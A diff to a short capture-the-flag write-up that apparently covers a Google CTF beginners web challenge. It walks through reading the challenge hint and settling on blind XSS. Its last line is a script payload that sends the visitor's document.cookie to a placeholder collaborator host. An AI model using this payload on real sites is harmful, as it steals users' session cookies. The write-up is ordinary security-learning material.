@@ -1,6 +1,11 @@
-Blind XSS
+The description of this states "Loose Zips sink large commercial properties with a responsibility to the shareholders."
+Which sounded odd to me. When googling "loose zips sink" the first hit is https://www.theregister.co.uk/2018/06/05/zip_slip_bug_archives/
 
-https://security.stackexchange.com/questions/106224/xss-display-cookie-of-another-website
+The title of the article is "Loose .zips sink chips: How poisoned archives can hack your computer" but I didn't come across any file uploads. 
+
+Figured it was Blind XSS as there was no reflection and https://capturetheflag.withgoogle.com/#beginners/web-gov-xss
+
+Found this post https://security.stackexchange.com/questions/106224/xss-display-cookie-of-another-website
 
 <script>document.write('<img src="http://BURPCOLLABORATOR/evil.php?cookie=' + document.cookie + '"/>')</script>
 
